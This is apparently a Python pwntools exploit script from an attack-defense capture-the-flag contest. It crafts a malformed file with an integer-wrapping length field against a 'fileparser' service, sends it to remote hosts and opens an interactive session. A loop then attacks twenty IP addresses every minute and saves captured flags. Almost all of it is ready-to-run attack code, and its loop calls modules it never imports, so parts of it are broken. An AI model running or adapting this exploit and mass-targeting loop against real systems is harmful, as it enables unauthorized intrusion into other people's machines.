from pwn import *

context(arch = 'amd64', os ='linux', endian = 'little')
context.log_level = 'debug'

def setnumber(n):
	s = '' + chr( (n & 0x7f) )
	n /= 0x80
	while n != 0:
		s += chr(0x80 | (n & 0x7f) )
		n /= 0x80
	return s[::-1] 

def game_start(ip, port, debug = 0):
	if debug == 1:
		p = process('./fileparser')
	else:
		p = remote(ip, port)
	# gdb.attach(p, 'b*0x400CED')

	payload = ''
	payload += "584D465F".decode("hex")
	payload += "322E3030".decode("hex")
	payload += p32(0x02000000)
	payload += p32(0x01000000)
	payload += setnumber(1)
	payload += setnumber(0)
	payload += setnumber(0x80)
	payload += '\x00' * (0x80 - len(payload))

	payload += setnumber(1)
	payload += setnumber(2)
	payload += setnumber(4)
	loop2 = len(payload)
	payload += setnumber(loop2 + 1 - 0x80)	
	payload += setnumber(1)

	payload += setnumber(-5 + 2**32)
	payload += setnumber(0)
	payload += setnumber(9)
	payload += setnumber(0x80) #offset
	payload += setnumber(1)
	payload += "4D546864".decode("hex")
	payload += '\x00' * 0x100

	p.sendline(str(len(payload)))
	p.send(payload)
	p.interactive()

if __name__ == '__main__':
	# game_start("", 11 ,1)
	
	port = 1802
	iplist = ['192.121.' + str(i) +'.35' for i in range(1, 21)]
	# iplist = []
	while 1:
		fd = open('./csgd_flag.txt', 'w')
		for ip in iplist:
			try:
				flag = pwn_csgd_bug1.game_start(ip, port)
				fd.write(flag + '\n')
				continue
			except Exception as e:
				print e
			try:
				flag = pwn_csgd_bug2.game_start(ip, port)
				fd.write(flag + '\n')
				continue
			except Exception as e:
				print e
			try:
				flag = pwn_csgd_bug1.game_start(ip, port)
				fd.write(flag + '\n')
				continue
			except Exception as e:
				print e
		fd.close()
		time.sleep(60)